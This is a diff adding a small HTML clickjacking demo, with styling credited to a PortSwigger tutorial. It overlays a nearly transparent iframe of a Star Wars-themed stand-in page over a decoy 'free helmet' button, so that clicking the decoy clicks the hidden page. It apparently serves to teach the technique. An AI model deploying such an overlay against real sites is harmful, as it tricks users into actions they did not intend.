@@ -1,0 +1,31 @@
+<html>
+    <head>
+        <title>Clickjacking Demo</title>
+        <!--Style code from https://portswigger.net/web-security/clickjacking -->
+        <style>
+            #target_website {
+              position:relative;
+              top: 10px;
+              width:500px;
+              height:500px;
+              opacity:0.1;
+              z-index:2;
+              }
+            #decoy_website {
+              position:absolute;
+              width:900px;
+              height:500px;
+              z-index:1;
+              }
+          </style>
+    </head>
+    <body>
+        <div id="decoy_website">
+            <h1>Hi Lord Vader, do you Want a free new helmet?</h1>
+            <form>
+                <input type="submit" name="submit" value="sure, get me this free helmet!" />
+            </form>
+        </div>
+        <iframe id="target_website" src="http://darkside.me/deathstar.php"></iframe>
+    </body>
+</html>
